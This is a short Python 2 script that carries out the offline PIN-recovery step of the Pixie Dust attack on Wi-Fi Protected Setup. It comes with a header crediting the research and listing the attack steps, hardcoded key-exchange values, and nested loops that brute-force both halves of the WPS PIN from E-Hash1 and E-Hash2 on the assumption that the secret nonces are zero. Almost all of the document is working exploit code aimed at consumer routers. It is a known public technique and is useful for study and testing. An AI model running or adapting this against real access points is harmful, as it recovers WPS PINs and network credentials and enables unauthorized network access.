#!/usr/bin/env python
# -*- coding: utf-8 -*-

'''
	All credits of this attack are for Dominique Bongard @Reversity
	Coder : @enovella_
	Thanks to  soxrok2212 and wiire

	Attack: (M3) Find out ES1 and ES2, then bruteforce offline PSK1 and PSK2

	Ehash1= HMAC(ES1||PSK1||PKe||PKr)AuthKey
	Ehash2= HMAC(ES2||PSK2||PKe||PKr)AuthKey

	PSK1 = first 128bits of HMAC(1rd half of PIN)AuthKey
	PSK2 = first 128bits of HMAC(2nd half of PIN)AuthKey

	(M3)  =  E-R       Ehash1||Ehash2

	Pixie Dust Attack
	=======================================
	1. Do the WPS protocol up to message M3
	2. Get the Nonce from M1
	    Bruteforce the state of the PRNG
	3. Compute ES1 and ES2 from the state
	4. Bruteforce PSK1/PSK2 from Ehash1/Ehash2
	5. Do the full WPS protocol to get the credentials
'''

import hashlib, hmac

PK_E    = "11e11709c0836c10e5a93a415f7869c5351f7218ab68867c3a1f8dbb9b8f984c"\
          "e0eabcbfd212fdc04fd9b3675e9dd9578d53ed5904177bdbe4fe64008a4a47de"\
          "50e7fc6409dc750b295565f54f1fe78582d78de0fac72675677cb1c85c5ca46a"\
          "5fced284ad79a27b4c38038b207ee76d3d556d7c3606310e52f5c6123a1f4997"\
          "6566cc21c31d40e5412decb2712d07667ac0803b21ca1df15f8f25814dc313cf"\
          "7bcdffeac436b5f2d40ceb18df5d90ac1e545eddd43ec7e78d4970d313a65746".decode("hex")

PK_R    = "531ff143e7ef3663de555704904fbe5417a2b465f175cf55e01ab94cff9156d3"\
		  "b6c272d1315fa70c4719897cea28f984ba0eccf22e86f48d4f8a275fcc78e37a"\
		  "b81e917a376e038595ab980d57898224aed228052f29efa6299f11cd4d7aa562"\
		  "b7baf1404ae8a15b70c130718cb1e0db6a32af3be2eb073927ef414ea2fd5ced"\
		  "6595a95c5e28fa3badf69ddb15f9f74deb1690139122eab14f99adc9d360f7d4"\
		  "f066fab35b77a46eb7286172eae8dd7eda768849307f9b00f06d69571b9da243".decode("hex")

eHash1  = "c14b83a3415999bba082f467872fd4bc9b79778b33d1d20cab55cb7d0b96cf43".decode("hex")
eHash2  = "3516ace7cd46bcbcac83b3065be66a89186a54da8800d336041e8ab847929416".decode("hex")
AuthKey = "d5c7e4a9fb5911b31dcbf80db712b34ed71a9218c9c111992c60d883e197e9ea".decode("hex")

# if ES1,ES2 are found out, recover the halves of PIN
second_half = first_half = 0
es1         = es2        = '\00' * 16   # (str(es2).zfill(32)).decode('hex')
for first_half in xrange(10000):
	PSK1_guess   = hmac.new(AuthKey, (str(first_half)).zfill(4), hashlib.sha256).digest()[:16]
	eHash1_guess = hmac.new(AuthKey, es1 + PSK1_guess + PK_E + PK_R, hashlib.sha256).digest()
	if (eHash1 == eHash1_guess): #First half done
		for second_half in xrange(10000):
			PSK2_guess   = hmac.new(AuthKey, (str(second_half)).zfill(4), hashlib.sha256).digest()[:16]
			eHash2_guess = hmac.new(AuthKey, es2 + PSK2_guess + PK_E + PK_R, hashlib.sha256).digest()
			if (eHash2 == eHash2_guess): 
				print "PIN FOUND!  %04d%04d" %(first_half,second_half)
				# doWPSprotocolWithPINguessed() #TODO
				exit()

